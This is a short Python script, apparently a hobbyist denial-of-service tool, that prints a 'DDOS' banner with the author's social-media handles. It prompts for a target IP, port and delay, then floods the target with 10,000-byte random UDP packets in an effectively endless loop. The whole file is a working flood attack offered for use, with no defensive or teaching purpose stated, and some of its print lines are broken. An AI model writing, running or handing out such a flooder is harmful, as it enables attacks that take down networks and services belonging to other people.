import socket, random, time
print('''

██████╗░██████╗░░█████╗░░██████╗
██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░
 
|=================================================|
|      [ + ] by kavani                            |
|=================================================|
|      [ + ] Instagram : 2knn01                   |                   
|=================================================|
|      [ + ] Telegram : https://t.me/kavani2knn10 |                   
|=================================================| 
''')


s = socket.socket (socket .AF_INET, socket. SOCK_DGRAM)

ip = input ("Enter Target IP : ")
print(""+ip)
port = int (input ("Enter Target Port : "))
print(""+port)
sleep = float(input ("Sleep : "))
print(""+sleep)

s.connect((ip,port))

for i in range(1, 1000**1000):
    s.send(random._urandom (10)*1000)
    print(f"Send: {i}", end='\r')
    time.sleep(sleep)
